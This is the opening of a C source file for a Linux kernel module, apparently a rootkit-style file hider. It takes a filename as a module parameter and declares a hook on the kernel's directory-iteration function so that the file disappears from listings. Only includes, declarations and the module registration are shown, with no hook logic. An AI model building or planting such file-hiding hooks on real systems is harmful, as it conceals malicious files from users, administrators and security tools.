#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include "HookEngine.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yuhang");

static char *fileToHide = "";
module_param(fileToHide, charp, 0000);
MODULE_PARM_DESC(fileToHide, "Please input filename of the file to be hidden");

/*declare vfs_readdir, this function is exported by kernel*/
int iterate_dir(struct file *file, struct dir_context *ctx);

/*hook vfs_readir, logic is based on the implemention of syscall 
 *getdents.
 * */
static int hook_iter(struct file *file, struct dir_context *ctx);

static int __init hideFile_init(void);

static void __exit hideFile_exit(void);

module_init(hideFile_init);
module_exit(hideFile_exit);
